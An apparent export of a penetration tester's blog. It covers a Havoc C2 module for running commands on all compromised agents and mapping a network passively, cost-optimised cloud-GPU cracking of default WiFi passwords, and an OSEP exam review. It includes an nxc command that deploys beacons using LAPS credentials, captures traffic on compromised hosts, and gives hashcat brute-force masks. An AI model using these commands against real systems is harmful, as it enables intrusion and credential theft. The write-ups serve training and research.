{"/about/":{"data":{"":"","other#Other":"\nI’m just a monkey lost in a human’s world. This website is my temple. I type on keyboard, code appears. Sometimes the code works, sometimes it doesn’t. But you can’t blame me. I’m just a monkey in a human’s world.\nMy monkey duties include typing on keyboard, clicking on mouse, hitting computer with wrench until IT comes running. But they can’t get mad, they can’t fire me. I’m just a monkey in a human’s world.\nSometimes I finish cigarette and breath in oxygen. This temporary burst of energy helps me do incredible things, like type on computer fast, break software, make machine go brrrrrrrrrr. And then cigarette comes back, and stops me in my tracks. But you can’t blame me. I’m just a monkey in a human’s world.\n~ fyx(me) - A monkey in a human’s world\ntldr do hack write code type on keyboard loose CTFs against cracked 15 year olds with 80 years of hacking experience self whoami.txtprogrammer, red teamer, pentester, and jack of all trades with a general passion for pretty much anything cyber. certifications Current list of certifications I’ve achieved.\nOffensive Security Web Expert (OSWE) Offensive Security Experienced Penetration Tester (OSEP) Certified Red Team Operator (CRTO) Certified Red Team Professional (CRTP) Offensive Security Certified Professional (OSCP) CREST Practitioner Security Analyst (CPSA) CREST Registered Penetration Tester (CRT) contact Messages without cute cat or monkey pictures have a higher chance of landing in my spam folder. Do what you will with that information…\nsocials @_fyxme email # email in python def get_email(domain): return \"fegv\" + \"@\" + domain print(get_email(\"proton.me\")) Too hard? Just use this…\nI found this email by bruteforcing protonmail’s username validation endpoint. Couldn’t be bothered to find enough proxies to rotate them and find a valid 3 letter address… Might revisit this in the future.\nwebsite This website is an attempt to document research I do, bugs I find, things I break, tools I make, and useful resources or knowledge I come across. Documenting some of the work I’ve made public.\nThe website is always a work in progress… Your Mileage Will Always Vary.\nsitemap technologies The following tools, libraries and services are used to maintain the website:\nhugo | golang static site generator hextra | hugo theme used as a base (this has been heavily customised and I will most likely fork and divert from it sooner or later) github pages | website hosting cloudflare | domain name renewal (originally registered on namecheap) giphy | da monkee gifs custom python scripts | maintenance, deployment \u0026 other shenanegans to make it compatible with obsidian Optimisation Some optimisations are performed to reduce file sizes and improve overall website speed:\nStripping Metadata from images, GIFs and videos using exiftool Lossless image compression using ffmpeg to convert to webp image format I may write a mini article in the future to explain how these are used, showcase how much size reduction we can achieve and show tricks to leverage the full potential of these tools.\nNo modifications are made to GIFs as they are already very well optimised by Giphy. (Lossy compression is possible)\nhelpers Finding giphy media url The gif websites are super stingy about sharing their .gif urls… I can never remember how to find it, so here goes nothing:\nTake the url: https://giphy.com/gifs/monkey-phone-cell-l41lVsYDBC0UVQJCE Extract the end bit: l41lVsYDBC0UVQJCE Put the fluff around it: https://media.giphy.com/media/\u003cend bit\u003e/giphy.gif Profit: https://media.giphy.com/media/l41lVsYDBC0UVQJCE/giphy.gif ^ This also works for giphy “clips”\nAlternatively, you can use this “downloader”.\nOther The almighty OG website The Almighty OG Website The OG website was a minimalist single page HTML website which would be updated manually and simply contained redirect links to GitHub Markdown files in various repos.\nThe simplicity of it was great but I wanted something more robust with easy markdown conversion and simple site navigation. Also wanted the content to be hosted and displayed on the fyx.me domain and not in random repos on Github.\nSince the website is a self contained html page its easy to keep around and host.\nIf you want to check it out, it’s available here.\nsimplicity This is the only CSS required to style the whole page. Isn’t that just beautiful…\nbody { font-family: monospace; display: flex; } nav { margin-right: 2em; padding: 1em; } ul { margin: 0; padding-left: 1em; } ul.spaced-list \u003e li { margin-bottom: 1ex; } hr { border: 1px solid gray; margin: 2ex 0; } a { text-decoration: none; } a:hover { text-decoration: underline; } body { background-color: #111; color: #fff; } a { color: #3cf; } a:visited { color: #c6f; } ","self#self":"","tldr#tldr":"","website#website":""},"title":"About fyx(me)"},"/articles/":{"data":{"":" Articles below are new articles I’ve written after migrating to fyx.me v2.0. A lot of these are new research projects, tool development, and longer pieces of writing on cybersecurity, programming and other tech topics which I find interesting.\nOld articles, CTF/boot2root writeups and post-mortem links can be found at the old website here "},"title":"articles"},"/articles/creating-a-havoc-module-to-run-commands-on-all-agents-at-once-and-map-out-an-environment-passively/":{"data":{"":" Tldr\nWrote a Havoc Module to run commands on all connected agents, used it to gather network information on all compromised hosts by performing packet captures, and analysed the data offline to map out the environment and find open ports and services. The tool can be found here: https://github.com/fyxme/havoc-runall-poc\nDo you sometimes get this urge to run rm -rf on all your beacons at once? Or maybe you’re a ransomware operator who wants to execute your ransomware BOF through all your beacons? Worry no more, the Havoc Run All Module is here!\nThe Havoc Run All Module allows you to run commands on all connected agents, which could prove useful when searching for something, running post-exploitation on a number of hosts and/or downloading files on all compromised hosts at once.\nNote: executing ransomware this way would actually be stupid since you’d need to have a beacon on every machine you wish to ransom… As is currently done in ransomware operations, its much easier to use GPO, Intune, SCCM or any other software deployment tool. This is only a fun project which will increase IOCs when used and increase the likelihood of being compromised… So ackchyually, I’m doing blue team a favor here. Its ok… Thank me later.","conclusion-and-use-cases#Conclusion and use cases":"The Havoc Run All Module is a fun tool to play around with in test environments but since it generates a lot of IOCs, it wouldn’t be too practical in Red Team engagements unless you’re looking to go all out and validate that the Blue Team can catch you.\nI do see some potential within practice environments like HTB Pro Labs, OffSec OSEP, etc. It’s overall really fun to use and does feel pretty powerful when you don’t have to worry about OPSEC! Combine it with a BOF that searches for flags or does post-exploitation looting and you’ve got yourself a powerful weapon for those pesky practice environments which hide loot everywhere.\nPassive Network Monitoring and analysis has a lot of potential for attackers willing to expand their knowledge of the network without having to actively probe ports and hosts. Definitely something I will investigate further in the future…\nThe Havoc Run All Module can be found here: https://github.com/fyxme/havoc-runall-poc","figuring-out-which-of-my-beacons-are-alive#Figuring out which of my beacons are alive":"The first use case I found for this was to sync all my beacons (using the sleep command) and finding out which of my beacons are alive by running a dummy BOF.\nTo sync all the beacons, I first run sleep 0 on all of them to get them to return all at the same time (some limitations in the current version of Havoc make it unreliable when the beacons do not return at similar intervals):\nhavoc \u003e runall sleep 0 All Havoc beacons synced together To get details about the alive beacons, I’ve created a command (getalive) which run a dummy BOF on all the agents. This BOF returns the hostname and the username of the underlying beacon allowing us to check which beacons are actually alive and which ones might be dead:","future-research#Future Research":" Explore packet analysis further. Develop additional analysis tools to filter, search and visualise PCAP data. SYN-ACK responses indicates open ports but may miss ports if the packet capture was started after the connection occurred Turn the packet analysis C tools into a BOF that can also capture network packets and passively identify open ports without having to export large Packet Capture files over C2 comms Look into trying out GRASSMARLIN which is targeted towards Industrial Control Systems (ICS), however could still be useful to map out an environment from a PCAP ","passively-mapping-out-an-internal-environment-using-packet-captures#Passively mapping out an internal environment using Packet Captures":"With firewalls, network access controls, and network segmentation, it can be tough to identify which machines can talk to which ones. There are tools out there that can help map out a network environment but they require active scanning of target devices. You could also use DNS cache to get an idea of what the machine is trying to talk to but it does not necessarily correlate with what it can reach (eg. DNS for a machine that is firewall/blocked off).\nInstead, we can look at currently outgoing data and see if we can create our own map from passively analysing network packets. To do this, we would need access to Network Routing Device like a switch or we can rely on running packet captures on a large number of hosts within the environment. Since we’re testing out the Havoc Run All Module (and there’s no network device we can compromise), we’ll use the second option and perform a packet capture on all of the hosts we have compromised.\nGathering the data We want to do this in the easiest way possible, without having to install tshark/wireshark or any other tools on the device. Since we’re targeting Windows machines, there are built-in tools we can use:\nThe old school netsh command which can capture network traffic using the netsh trace sub-command The new school pktmon (Packet monitor) which is built-in to Windows, starting in Windows 10 (version 1809). I wasn’t sure which Windows Host versions the environment was running and I didn’t want to check if every single one of those supported the new(ish) pktmon command so I opted for the trusty old school netsh command.\nNote\nIf you need to execute a binary (eg. deploy a beacon) on multiple hosts at once, netexec is a great tool for that.\nnetexec is very powerful and allows you to perform multiple actions with only one command. As such, you can build a netexec (also know as nxc) command to retrieve the LAPS password for multiple hosts, authenticate as the local administrator user to those hosts, upload a binary and execute it via command prompt (or PowerShell) in a single command:\nnxc smb targets.txt -u \"$LAPSUSER\" \"$PASSHASH\" --put-file \"$SOURCE_BIN\" \"\\\\Windows\\\\Temp\\\\$TARGET_BIN\" -x \"C:\\\\Windows\\\\Temp\\\\$TARGET_BIN\" --exec-method atexec --laps where:\ntargets.txt - a text file containing a list of targets you want to compromise $LAPSUSER - the user with permission to access the LAPS password in LDAP $SOURCE_BIN - the binary you wish to upload $TARGET_BIN - the binary name on the receiving host After deploying my beacons using nxc, I was able to connect to them in Havoc and they started pinging back periodically as expected:\nI then started a trace on all the beacons at once using the following commands:\n# start the trace runall powershell netsh trace start capture=yes tracefile=C:\\windows\\temp\\cap.etl # wait like 5-10 minutes for traffic to be generated runall powershell netsh trace stop # wait like 3-5 minutes until the trace is consolidated Console from one of the agents receiving the command Data collection and consolidation takes some time but once it’s completed you should see a message as such:\nConsolidation of data into CAB file At this point we have an ETL file (Microsoft Event Trace Log File) which can be opened by ETW-centric tools like Microsoft Message Analyzer, but cannot be opened by Wireshark and co. Ideally, we want a file format that is supported by most tools which analyse network data, aka we want a PCAP or PCAPng file. As such we can convert the .etl file into a .pcapng file using the etl2pcapng utility tool.\nI couldn’t be bothered to download all the .etl files to a local Windows VM so I’m using noconsolation (A BOF that runs unmanaged PEs inline) to execute etl2pcapng and convert all trace log files to .pcapng:\n# running etl2pcapng to convert etl to pcapng directly on the hosts # --no-output needed on certain OSes like Windows 2016 Server runall yesconsolation --no-output /home/lo/tools/etl2pcapng.exe C:\\windows\\temp\\cap.etl C:\\windows\\temp\\cap.pcapng Converting .etl to .pcapng directly on the hosts Warning\nThere is an issue with some of the automatically imported Havoc BOFs (commands) which cause the client to crash under certain conditions. For example running runall noconsolation will crash the client. To fix it you need to import the BOFs yourself, which is what I’ve done here with the yesconsolation command (noconsolation -\u003e yesconsolation). This is not something I have control over, however from the code updates I’ve seen, it should be fixed in the Havoc re-write version.\nDownloading \u0026 Merging the data At this point we have a .pcapng file for each host which we need to download and merge so we can analyse the data offline. To do this we can use the built-in Havoc download command to retrieve the .pcapng files:\nrunall download C:\\windows\\temp\\mycoolnetwork.pcapng Depending on how large the PCAP is, this may take a while… You can use the last seen tab to know when the file has finished downloading vs when it’s still downloading:\nOnce downloaded, you can navigate to your local Havoc install and find the data/loot folder which is where the downloaded files will be located:\nNow we don’t want to deal with each packet capture one at a time, so instead we can merge them into a single large PCAP file using the mergecap tool (which is part of Wireshark):\nSome tools might not work with pcapng (eg. the free version of NetworkMiner) and require the old school pcap format instead, which we can easily create using tshark (part of Wireshark as well):\nThe old school PCAP format does not have all the bells and whistles of the PCAPng format and therefore may loose some data during conversion. This explains the discrepancy in the file sizes above.\nAnalysing the data Note\nWe didn’t filter the data before combining it, which means 2 systems talking to each other will have generated the same packets (in opposite direction) which would have been captured during data gathering. Hence, if we captured the data correctly, we can assume that we have at least double the amount of packets needed (disregarding packet loss). I’ll leave the packet filtering as an exercise for the reader. Alternatively, we could use the extra packet to compare both hosts to ensure no packet manipulation is being performed between the hosts and perform additional data analysis.\nIgnoring the duplicate packets, we can load this fat PCAP into NetworkMiner to get a quick overview of the environment. You can run NetworkMiner from Linux using mono (the Cross platform, open source .NET framework):\nmono NetworkMiner.exe --noupdatecheck Because its a big file and we’re running NetworkMiner via mono on Linux, this takes a while to process… Probably worth taking a coffee break here. Alternatively, you can probably parse this much faster on windows. But I’m lazy so imma go with the coffee break route instead…\nedit: I’ve been here a while… this is taking a looong time.\nAfter it finally finishes parsing, we get an idea about what we managed to capture, namely:\n44 hosts 1389 DNS queries 61 Credentials (these are mostly hashes) A lot of files (?!) A single host on the 10.10.14.0/24 network, namely my host since I performed the capture when no-one else was using the environment NetworkMiner Hosts Tab NetworkMiner Credentials Tab We can use tshark to generate a table like output of IP Communications and see which hosts are communicating together:\nI tried playing around with python tools but because the PCAP is of decent size, it was quite slow so I resorted to writing a good ol’ C program to parse the PCAP using libpcap which generates a DOT file that can be converted to a graph using GraphViz:\nThe graph above already highlights a few things about the environment:\nRED: my Kali VM; GREEN: the two entrypoints I’m using to gain access to the internal network (ie. jumpboxes); BLUE: the node which connects to nearly every other node in the domain aka the domain controller. We can also see the domain controller is talking to other nodes that I might not have compromised or have no beacon on, namely the IPs 10.10.120.20 and 10.10.122.20. There’s a good reason these don’t appear to be connected to any other node on the network but I’ll this as an exercise for the reader.\nWe can also see the two Google DNS IPs (8.8.8.8 and 8.8.4.4) being connected to the Blue node which indicate that the domain controller is likely using Google DNS server for external DNS queries. It also connects to multiple root name servers, namely e.root-servers.net (192.203.230.10) and g.root-servers.net (192.112.36.4).\nAs such, we have a decent overview of the network. We can also start performing additional data analysis to for example find open ports and services on the network like HTTPS (port 443), RDP (port 3389) and Microsoft SQL Server (port 1433):"},"title":"Creating a Havoc Module to run commands on all agents at once and map out an environment passively"},"/articles/isp-default-wifi-passwords-are-costlier-to-keep-than-to-crack-value-optimised-cloud-gpu-password-cracking/":{"data":{"":"This article won’t tell you how bad the Canadian oligopoly is, there’s already posts ranging from 2008 to 2024 to tell you all about that! Instead, I’ll focus on their poor default WiFi password standards. I’m mentioning Canadian Internet Service Providers (ISPs) as an example here but so many ISPs and router manufacturers decide to set worse default passwords then your 3 year old toddler…\nI’m not going to name any ISPs directly because I don’t want to annoy anyone and I’m just writing this for education purposes. I will use fictional password patterns that may or may not resemble real ISP default WiFi Passwords.","conclusion#Conclusion":"There’s two parts to this blog which deserve their own conclusion.\nISPs and router providers need to up their game when it comes to setting default passwords. The password templates they use are really weak and a determined attacker will crack your WiFi with less than a year’s worth of service in computing power. Furthermore, the rise of AI has boosted the GPU rental market tremendously and people have flooded the market with ever cheaper GPUs. This brings us to our second conclusion.\nIts important to test your tools and compare offerings if you want to find the most valuable opportunity out there. There’s already plenty of hashcat benchmarks online you can assess to find the best GPU for the hash mode you are targeting. Compare those cracking speeds with the GPU offerings and you’ll find the best value offerings. The cheapest GPU is not always the best! I’ve decided not to release any tools yet as I’m still building out functionality for those but I intend on release something in the near future which should automate. Stay tuned!\nFinally, remember to always change those pesky default passwords to something safe and secure. Regardless of your password, I would also not recommend using the default router provided by your ISP. These are usually cheap as they are mass manufactured, potentially more likely to have vulnerabilities and usually have a functionality for ISPs to be able to access remotely (aka built-in backdoor)… If you’re serious about security, it might be time to use your own router. You can change the MAC address to match the router they provided so they don’t get annoyed.\nTest your tools, secure your stuff and stay safe out there.\nImprovements and future research ideas Better benchmarking database using benchmarks found online and application/tool to periodically identify the best value offering based on benchmarks and rental price Using LLMs to search and scrape images for WiFi credentials and MAC addresses, store those in a database and generate SSID/password patterns per router/ISP type ","cost-and-speed-optimisations#Cost and Speed Optimisations":"Math is fun and all but in the end we still want to crack hashes the fastest and cheapest way possible. For this, we need to:\nBenchmark various GPUs and compare them Use our estimated cracking speeds and compare with GPU rental market prices to find the best value offerings Split our workload between different machine instances to increase cracking speed Benchmarking hashcat speed on various GPUs You can find a number of hashcat benchmarks online in gists, github repositories and various other websites. For this example, I’ve rented out 3 machines with NVIDIA RTX GPUs and I’ve ran a hashcat benchmark for each of them:\nmachine #1: Hashcat v7.0.0 benchmark on 5x NVIDIA GeForce RTX 3090 machine #2: Hashcat v7.0.0 benchmark on 7x NVIDIA GeForce RTX 4090 machine #3: Hashcat v7.0.0 benchmark on 2x NVIDIA GeForce RTX 5090 Here are the results:\nThis obviously show that the RTX 5090 is better than the 4090 and 3090 but is it the best value to rent a RTX 5090 vs a 4090/3090?\nFinding the best value GPU market offering To get the most value per each dollar spent, we need to compare the benchmarks we did above with the machine offerings available to us. To do this, I identified the endpoint for querying vast.ai’s machine offering and downloaded those offerings. I then compared the offering with the average hashes per second by GPU type which gives me the machine with the best value opportunity (ie. cheapest per hash crack attempt):\nAs we can see from the table, Offering ID 23752330 is our best choice which is not necessarily the first option in the vast.ai UI:\nvast.ai marketplace listings with best offering selected Obviously, the offerings and prices change over time so you’d need to do this regularly to get a better estimate. Prices in our table are also estimates and may differ slightly vs prices displayed on the site.\nSplitting the workload between multiple instances Once we have rented multiple machines, we’ll want to split our hashcat workload between the different instances. For our optimistic bruteforce use case, we can do it with hashcat’s skip / limit mechanism plus a little scripting so that every machine works on a non-overlapping slice of the keyspace.\nHOSTS=5 # number of hosts K=$(hashcat -m 22000 -a 3 -1 ?u?l?d --keyspace 'FYXME?1?1?1?1?1?1?1?1') # calculating keyspace slice=$(( K / HOSTS )) # number of attempts per host # for each host where i is the host index hashcat -m 22000 hashes.hc22000 -a 3 -1 ?u?l?d FYXME?1?1?1?1?1?1?1?1 -s $((slice * i)) -l $((slice)) Since this is basically just a VPS, there’s already so many tools to split workloads:\nax / axiom / ansible : Tools to help split workloads/commands on a list of servers hashtopolis : web application for distributed password cracking with Hashcat hashcrack-ai : An all in one script to setup and crack passwords on vast.ai GPU instances (not recommend, code is meh) custom: just write your own ssh wrapper… LLMs can basically one shot this. Note\nWhen using interruptible instances, your instance may shut down if someone outbids you. As such, its important to take progress snapshots which can be done easily in hashcat using sessions (--session \u003cfilename\u003e). And restored using the following command: hashcat --session \u003cfilename\u003e --restore","identifying-default-router-password-patterns#Identifying Default Router Password Patterns":"If you have a physical router, simply grab the router and look for the “password” line on the sticker behind it…\nI told you I was dropping INSANE alpha in this post! If you’re a peasant like me and can’t afford the router, don’t worry I’ve got the second best thing for you!\nYou can use your favourite search engine to find images of the router including the magic sticker I mentioned above! Ebay resellers could not care less and will happily take photos of the device’s SSID and Password which means a simple search can already give you an idea about what the password looks like (and if you’re the poor sucker who bought the router from them then your password is already out there):\nGoogle Search for 'Livebox router ebay bottom' Ebay listing for Livebox Router with password visible Note\nI’m using Orange/Livebox as an example not because I want to roast them, but actually because their default passwords are usually pretty decent on these devices! Good job Orange!\nDefining password patterns To be able to identify the password pattern, you may need more then 1 router password (ie. differentiating between alphanumeric and hexadecimals). You can get this trivially by doing a reverse image search on the router sticker you’ve already found as such:\nGoogle Reverse image search for Livebox Router Once you have a few samples, you can define the default password pattern. Using Livebox again as an example, the pattern appears to be the following:\ncharset = uppercase + lowercase + digits charcount = 18 pattern = 18 x charset In plain English, the pattern for Livebox routers is 18 seemingly random alphanumeric characters with uppercase and lowercase letters.\nWe’ll come back to this example later to show why I believe this is a decent default router password.","references#References":"Hashcat benchmarks:\nhttps://gist.github.com/fyxme/8a63bb1a6ff901766f6345acaf135f7e https://gist.github.com/fyxme/bac0a4144d196c779cda545122f1539a https://gist.github.com/fyxme/843b3bc58cd75af62650e99acf18f164 https://gist.github.com/Chick3nman https://www.onlinehashcrack.com/tools-benchmark-hashcat-gtx-1080-ti-1070-ti-rtx-2080-ti-rtx-3090-3080-4090.php GPU provider:\nhttps://cloud.vast.ai/ Datasets:\nRTX 3090/4090/5090 benchmark: https://baserow.io/public/grid/mIZ-q6B0xE6rOT5AgWAeq1eR3aJ49kJZUPTl_7jnw3Q Optimal Cloud GPU Selection: https://baserow.io/public/grid/O2pdJNO__5jHXRic2rEw_dnTizQ9ZPY03GDTTJKrlmM Other readings:\nhttps://systemoverlord.com/2021/06/05/gpu-accelerated-password-cracking-in-the-cloud.html https://axelum.eu/en/article-gpu-cloud-password-cracking https://github.com/k3nundrum/hashcrack-ai ","using-cloud-gpus-for-password-cracking#Using Cloud GPUs for password cracking":"I’m not going to cover how to do WiFi pentesting, so lets assume we’ve done WiFi testing and have recovered the Access Point’s hash. To emulate this, my friend Kimi K2 wrote a python script to generate a hashcat compatible hash from a given SSID and password:\n# Generating the hash using the script $ python3 wifi_hash_generator.py \"HelloWorld\" \"SpicyPassword123\" | tee hash.txt WPA*01*09cd77f4bf8f32034914268c4980c40e*321bf0d198e4*8a429335416d*48656c6c6f576f726c64*** # Create a wordlist with the password $ echo \"SpicyPassword123\" \u003e wl.txt # Verify that the SSID decodes correctly from the hash $ cat hash.txt | egrep -v \"^$\" | python2 -c \"import sys; print(''.join([l.split('*')[5].decode('hex')+'\\t'+l for l in sys.stdin]))\" HelloWorld\tWPA*01*09cd77f4bf8f32034914268c4980c40e*321bf0d198e4*8a429335416d*48656c6c6f576f726c64*** # Showing the hash can be cracked using hashcat $ hashcat -m 22000 hash.txt wl.txt lo at kali hashcat (v6.2.6) starting [...redacted for readability...] 09cd77f4bf8f32034914268c4980c40e:321bf0d198e4:8a429335416d:HelloWorld:SpicyPassword123 Session..........: hashcat Status...........: Cracked Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL) Hash.Target......: hash.txt Time.Started.....: Wed Aug 20 05:18:13 2025 (0 secs) Time.Estimated...: Wed Aug 20 05:18:13 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (wl.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 392 H/s (0.55ms) @ Accel:64 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 1/1 (100.00%) Rejected.........: 0/1 (0.00%) Restore.Point....: 0/1 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: SpicyPassword123 -\u003e SpicyPassword123 Started: Wed Aug 20 05:18:12 2025 Stopped: Wed Aug 20 05:18:15 2025 The above demo shows the hash is valid and can be used with hashcat to emulate a captured WiFi hash.\nFor the next part, we’re going to choose a random password pattern that is definitely not a password pattern used by some ISP in Canada.\nWe’ll use the following password pattern, a fixed string (ie. “FYXME”) followed by 8 random alphanumeric characters:\ncharset = uppercase + lowercase + digits charcount = 8 pattern = \"FYXME\" + 8 x charset Using the script showcased above, we can create a valid hash for our fictitious WiFi Access Point:\n# generating a random password that matches our pattern $ printf 'FYXME%s\\n' \"$(tr -dc 'A-Za-z0-9' \u003c/dev/urandom | head -c 8)\" FYXME0s385dFg $ python3 wifi_hash_generator.py \"FYXME-9999\" \"FYXME0s385dFg\" WPA*01*1096bab4d7f172a4f2016bb0d83cf795*2b37f50e88a7*46f6be6294b2*4659584d452d39393939*** Assuming this was a hash captured via a WiFi capture tool like hcxdumptool or aircrack-ng, we could try to crack the password using the following hashcat command which performs a bruteforce attack with the password mask adjusted for our password pattern:\nhashcat -m 22000 hashes.hc22000 -a 3 -1 ?l?u?d FYXME?1?1?1?1?1?1?1?1 Cracking it offline is fun and all but what if we’re in a hurry and wanted more fire power?\nPassword cracking in the cloud In order to speed up cracking we can either buy really expensive GPUs or make use of the GPU rental markets which have exploded with AI and have driven the prices down significantly!\nI’m using vast.ai[^1] in this case since it has a section for interruptible GPUs (ie. similar to AWS Spot instances) which have lower prices when nobody is using them. This provides good opportunities to find cheap GPUs for research or pentesting purposes.\nA few tips and tricks that I’ve found while using vast.ai’s marketplace:\nYou can enable “interruptible” and “unverified” machines to be showed the lowest prices You can select the docker template you want to deploy on the machine and the templates library includes a Hashcat CUDA template for hashcat v7.0.0 Your credit goes down per minute so if you need it for less than 1 hour, you pay for the number of minutes you used making it potentially incredibly cheap. The interruptible machines market is a bidding system which means you can get outbid by other users vast.ai marketplace 'interruptible' machine listing If you’re lucky, you can find some real gems for example I found the following machine (5x RTX 3090) priced at $0.088/hr:\nvast.ai rented GPU 5x RTX 3090 In the end, its a VPS server so you can just ssh into it and proceed as you please. The UI allows you to set your SSH key for direct access.\nAfter setting up the SSH key, you can connect to your machine and run your hashcat command. In this case, we’re trying to crack the hash we generated previously so I run the following hashcat command:\nhashcat -m 22000 test.hc22000 -a 3 -1 ?l?u?d FYXME?1?1?1?1?1?1?1?1 -O -w4 Even with the firepower of five RTX 3090, this would take about 1 year 92 days to complete which seems like a lot but considering this is only 1 of the many machines we can rent, its really not that long:\nhashcat running on 5x RTX 3090 rented GPU I don’t want to wait 1 year 92 days for this article to come out so we’ll speed it up and use Math to see how much it would cost to crack that hash.\nCalculating cost to crack the hash We can use the hashcat estimates to calculate how much it would cost to crack the hash which ends up being $965 USD (or $482.5 USD on average):\nTime to finish: 1 year 92 days == 457 days == 10968 hours Cost per hour: $0.088 Cost to finish: 0.088 * 10968 ~= $965 Cost to finish on average: 965 / 2 = $482.5 We can also estimate this using the cracking speed and the number of potential passwords based on the password pattern (this will help us later when we look at benchmarking different GPUs):\nCracking speed: 5520.7 kH/s == 5520700 H/s Number of characters in our charset (uppercase + lowercase + digits): 26 + 26 + 10 = 62 Sample space based on our pattern (ie. number of possible passwords): 62 ** 8 = 218340105584896 Number of seconds to exhaust sample space: 218340105584896 / 5520700 ~= 39549351.64 Number of hours to exhaust sample space: 39549351.64 / 3600 ~= 10985.93 Cost to finish: 0.088 * 10985 ~= $967 Cost to finish on average: 967 / 2 = $483.5 Lets assume the monthly cost for our ISP is $62 CAD ($44.69 USD), again a totally random figure that does not represent any actual Canadian ISP. One year of service would cost us about $536.28 USD.\nIf we compare that to the average cost of cracking our generated hash, we find that it is LITERALLY CHEAPER to crack that hash then to pay for 1 year of internet service.\nComparatively, the Livebox (from Orange) would take $405,701,336,942,240,858,112 USD to crack… Might have to ask my grandma for a loan to help with this one…\nNumber of hours to exhaust sample space: 62 ** 18 / 5520700 / 3600 = 9.220484930505475e+21 Cost to finish: 9.220484930505475e+21 * 0.088 = 8.114026738844817e+20 = $811,402,673,884,481,716,224 Cost to finish on average: 8.114026738844817e+20 / 2 = $4.0570133694224086e+20 = $405,701,336,942,240,858,112 811,402,673,884,481,716,224 in words: eight hundred eleven sextillion, four hundred two quintillion, six hundred seventy-three quadrillion, eight hundred eighty-four trillion, four hundred eighty-one billion, seven hundred sixteen million, two hundred twenty-four dollars.\nNow you can understand why I said Orange’s default passwords are usually pretty decent!"},"title":"ISP Default WiFi Passwords Are Costlier to Keep Than to Crack (Value optimised Cloud GPU password cracking)"},"/articles/osep-exam-review/":{"data":{"":"","offsec-osep-exam#Offsec OSEP Exam":"Early December, I attempted the OffSec Experienced Penetration Tester (OSEP) certification exam. I survived a failed computer firmware update, slow and inconsistent internet speeds due to living in a 3rd world country (aka Canada) and a sleeping proctor who took an hour to unfreeze my camera and VPN but in the end…\nI successfully passed the exam! There’s a lot of OSEP reviews out there so I will try to minimise overlap with what overs have said. Use your google fu to find these!\nNevertheless, I’ve compiled a number of tips that will hopefully help you preparing for and taking the OSEP exam.\nPreparation We need to prep for exams? I thought the exam was the prep... Learn to use your tools, especially if you’re using a C2 other than the one taught in the course (ie. Metasploit).\nTJNull has a lot of great suggestions in his OSEP list of vulnerable machines. A lot of these can be used to test your tools in a controlled environment.\nMaking cheatsheets could also be useful especially when you do a lot of these (ie. boot2roots, CTFs or AD environments). Saves you time to just copy paste the commands directly instead of having to run -h / --help every 2 seconds…\nChoice of tools C2 Bazaar\nHavoc quick reference guide\nThe course is centered around Metasploit C2 but use any open source C2 you want and are comfortable with. I used havoc because I wanted to play around with it.\nDon’t be a hero and try to do everything from C2. If you know how to do it from Kali Linux (eg. impacket, netexec, etc) then use that…\nAs long as you have screenshots of retrieving the flag from an interactive shell, you’re gucci.\nAD Enumeration Bazaar\nAD Enumeration quick reference guide\nBloodhound is overrated in these small environments. Plus, the bloodhound client and/or server (depending on which version you are using) is super resource hungry.\nI’d recommend doing manual enumeration using tools like Powerview/powerview.py or adsearch.\nDefence Evasion Important\nYou’re not tested on OPSEC. You can do risky things w/o worrying about OPSEC and whether you should look at less noisy solutions. Just blast things and see what sticks.\nDon’t be scared to disable everything on the environment (eg. firewall, AV, running software), this isn’t production, this isn’t a client’s environment. You’re here to show you understand the vulnerabilities, misconfigurations and can bypass security configurations. If you need to, just revert and if you’re scared add a limitation for the report explaining you did this because you are aware that this is non-production environment and that the “client” (aka offsec) can reset the environment to its original state.\nUse your own time to explore other solutions which do not require disabling defences.\nScreenshot tool Note\nIt’s better to take more then less screenshots… I’d recommend taking fast dirty screenshots, don’t worry about extras and what not, just paste them in your note taking tool like obsidian and reformat them later when writing up the report.\nJust use flameshot, there’s no better alternative.\nYou can also remap your kali and/or host’s machine printscreen button to it.\nMakes your life easier… Simply Screenshot \u003e Edit it from the flameshot popup \u003e Copy \u003e Paste to your favorite editor (eg. Obsidian).\nOther tools You don’t need to do everything from the C2. It’s a free for all, the only requirement is to demonstrate that you have access to the machines in the environment and can reach the flags with an interactive shell, nothing else.\nSo make use of any AD tools you know, including those you can run through proxies (ie. proxychains) like impacket, netexec and powerview.py.\nThe Exam itself Important\nExam completion requirements and tips:\nA total of 100 points (10 points for each proof.txt and/or local.txt flags) OR you reach the end goal and retrieve the secrets.txt file from the target system. Once you reach 100 points, I would focus on ensuring you have all you need for the report (ie. screenshots for the attack paths, valid proof screenshots, notes, etc) and that you have submitted all you flags to the provided control panel. This ensures you don’t forget anything before running out of time. Proof screenshots have a specific format, they need to be taken from an interactive shell and include the (proof|local|secret).txt file contents and the ipconfig of the machine. Also recommended to add whoami in the screenshot because why not (it can help you with write ups later on). You do not need to use a C2 for everything in the exam. The only requirement is that you have screenshots of the flags from an interactive shell. So you can exploit the machine and then drop a beacon on there for example to take your screenshot. Completion txt files :\nproof.txt, local.txt - located on User’s home folder, or other publicly reachable folders. secrets.txt (its the last box on the environment so don’t just count on that to pass… if you’re stuck on one path, check the other paths.) In my opinion, the exam is a lot more straightforward / linear then you think compared to the OSCP.\nTake time to eat/sleep/shower/talk to friends (lol imagine having friends and taking a 3 day proctored exam).\nMake sure to read the OSEP Exam Guide and OSEP Exam FAQ in details before the exam.\nProctoring Caution\nDon’t forget a government issued ID to show to the proctor when the exam starts (don’t do like i did and panic to find any form of government id when they requested it…)\nFor the proctoring tool, I had to disable Wayland on Debian Linux because it was interfering with screen sharing (ie. could only share full screen and not individual screens).\nI lost close to 1 hour at the beginning because of this. I was told that if I could not get the proctoring tools working within the hour, they will end my exam and cancel it (ie. same as did not attend).\nHence, I would highly recommend that you test screen sharing to ensure you can share all your screens individually before the start of the exam. (And install the required extension if you end up using brave or chrome)…\nI ended using brave with the Offsec memory hogging screenshare extension… Now that I’ve read more OSEP reviews, I should have tried with firefox after I fixed my Wayland issue.\nTldr\nUse firefox. If you can only share your full screen and are running linux, it’s probably a Wayland issue (check online for fixes). If that doesn’t work, see if using brave with the screen share plugin works.\nAs with all OSEP exams, don’t worry about crashes 